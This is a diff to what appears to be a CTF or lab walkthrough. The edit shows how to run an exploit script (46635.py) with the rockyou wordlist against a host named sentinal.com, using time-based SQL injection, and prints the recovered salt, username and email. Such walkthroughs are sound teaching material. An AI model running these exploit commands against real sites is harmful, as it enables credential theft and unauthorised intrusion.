@@ -69,10 +69,12 @@ Before running the script make sure following packages are installed
 	pip install setuptools
 	pip install termcolor
 ```
-Execute the script with a wordlist to bruteforce
+Execute the script with a wordlist to bruteforce, it will use timebased SQL injection to find out the credentials. 
 ```
 python 46635.py -u http://sentinal.com -w /opt/rockyou.txt --crack 
-
+```
+Wait for the script to finish and you would find the following output
+```
 [+] Salt for password found: 551c92a536111490
 [+] Username found: juniordev
 [+] Email found: juniordev@sentinal.com
